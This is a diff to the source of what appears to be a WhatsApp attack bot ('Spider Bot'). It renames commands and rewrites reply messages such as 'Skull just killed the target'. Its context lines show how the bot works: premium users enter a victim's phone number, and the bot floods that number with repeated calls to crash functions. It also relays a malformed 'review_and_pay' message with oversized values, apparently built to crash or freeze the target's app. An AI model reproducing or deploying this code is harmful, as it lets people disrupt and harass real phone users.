@@ -12544,7 +12544,7 @@ await bakdok(target, force)
 await ngeloc(target, force)
 await bakdok(target, force)
 }
-await joreply(`<✓> 𝙎𝙥𝙞𝙙𝙚𝙧 𝘽𝙤𝙩 𝙃𝙖𝙨 𝙀𝙡𝙞𝙢𝙞𝙣𝙖𝙩𝙚𝙙 ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
+await joreply(`<✓> Spider Bot has Eliminated  ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
 }
 break
 //=================================================//
@@ -12592,7 +12592,7 @@ await ngeloc(target, m)
 await ngeloc(target, m)
 await ngeloc(target, m)
 }
-await joreply(`<✓> 𝙎𝙥𝙞𝙙𝙚𝙧 𝘽𝙤𝙩 𝙃𝙖𝙨 𝙀𝙡𝙞𝙢𝙞𝙣𝙖𝙩𝙚𝙙 ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
+await joreply(`✨Spider Bot has Eliminated  ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
 }
 break
 //=================================================//
@@ -12645,7 +12645,7 @@ await ngeloc(target, force)
 await ngeloc(target, force)
 await ngeloc(target, force)
 }
-await joreply(`<✓> 𝙎𝙥𝙞𝙙𝙚𝙧 𝘽𝙤𝙩 𝙃𝙖𝙨 𝙀𝙡𝙞𝙢𝙞𝙣𝙖𝙩𝙚𝙙 ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
+await joreply(`<✓> Spider Bot has Eliminated  ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
 }
 break
 //=================================================//
@@ -12676,7 +12676,7 @@ await pirgam(target, ryobug)
 await ngeloc(target, force)
 await pirgam(target, ryobug)
 }
-await joreply(`𝙎𝙥𝙞𝙙𝙚𝙧 𝘽𝙤𝙩 𝙝𝙖𝙨 𝙀𝙡𝙞𝙢𝙞𝙣𝙖𝙩𝙚𝙙 ${bijipler} 𝙐𝙨𝙞𝙣𝙜 ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
+await joreply(`Spider Bot has Eliminated  ${bijipler} 𝙐𝙨𝙞𝙣𝙜 ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
 }
 break
 //=================================================//
@@ -12699,7 +12699,7 @@ await joreply(`<✓> 𝙎𝙥𝙞𝙙𝙚𝙧 𝘽𝙤𝙩 𝙃𝙖𝙨 𝙀𝙡
 }
 break
 //=================================================//
-case '❗': {
+case '💀': {
 if (!isPremium) return joreply(mess.premium)
 if (!q) return joreply(`Penggunaan .${command} 6287392784527`)
 let bijipler = q.replace(/[^0-9]/g, "")
@@ -12719,7 +12719,7 @@ await ngeloc(target, force)
 await penghitaman(target, force2)
 await ngeloc(target, m)
 }
-await joreply(`<✓> 𝙎𝙥𝙞𝙙𝙚𝙧 𝘽𝙤𝙩 𝙃𝙖𝙨 𝙀𝙡𝙞𝙢𝙞𝙣𝙖𝙩𝙚𝙙 ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
+await joreply(`<✓> Skull just killed the target ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
 }
 break
 //=================================================//
@@ -12738,7 +12738,7 @@ await ngeloc(target, force)
 await ryozingod.relayMessage(target, { viewOnceMessage: { message: { "interactiveMessage": { "header": { "hasMediaAttachment": true, "jpegThumbnail": fs.readFileSync(`./media/overpix.png`).toString('base64') }, "nativeFlowMessage": { "buttons": [{ "name": "review_and_pay", "buttonParamsJson": JSON.stringify({ "currency": "IDR", "total_amount": { "value": 49981399788, "offset": 100 }, "reference_id": "4OON4PX3FFJ", "type": "physical-goods", "order": { "status": "payment_requested", "subtotal": { "value": 49069994400, "offset": 100 }, "tax": { "value": 490699944, "offset": 100 }, "discount": { "value": 485792999999, "offset": 100 }, "shipping": { "value": 48999999900, "offset": 100 }, "order_type": "ORDER", "items": [{ "retailer_id": "7842674605763435", "product_id": "7842674605763435", "name": "🖤⟩ ༘྅ᏃɛᏆֆʊɮᎾxᎽᎶɛℕ ☆ ꧏ🤍҈ ༑", "amount": { "value": 9999900, "offset": 100 }, "quantity": 7 }, { "retailer_id": "custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8", "name": "", "amount": { "value": 999999900, "offset": 100 }, "quantity": 49 }] }, "native_payment_methods": [] }) }] } } } } }, { participant: { jid: target } })
 await ngeloc(target, force)
 }
-await joreply(`<✓> 𝙎𝙥𝙞𝙙𝙚𝙧 𝘽𝙤𝙩 𝙃𝙖𝙨 𝙀𝙡𝙞𝙢𝙞𝙣𝙖𝙩𝙚𝙙 ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
+await joreply(`<✓> The target has been heart broken  ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
 }
 break
 //=================================================//
@@ -13356,7 +13356,7 @@ await joreply('✅Succes')
 }
 break
 //=================================================//
-case 'ajimale': {
+case 'spider-kill': {
 if (!isPremium) return joreply(mess.premium)
 if (!q) return joreply(`Penggunaan .${command} 6287392784527|1`)
 let ppek = q.split("|")[0]
@@ -13381,7 +13381,7 @@ message: {
 }), { userJid: target, quoted: force })
 await ryozingod.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
 }
-await joreply('✅Succes')
+await joreply('Spider just Killed the target 💀')
 }
 break
 //=================================================//
@@ -13395,7 +13395,7 @@ await joreply('✅Succes')
 }
 break
 //=================================================//
-case 'senggol': case 'Spider1': case 'Spider2': case 'Spider3': {
+case 'senggol': case 'spider1': case 'spider2': case 'spider3': {
 if (m.isGroup) return joreply("Only In Private Chat")
 if (!isPremium) return 
 for (let j = 0; j < 5; j++) {
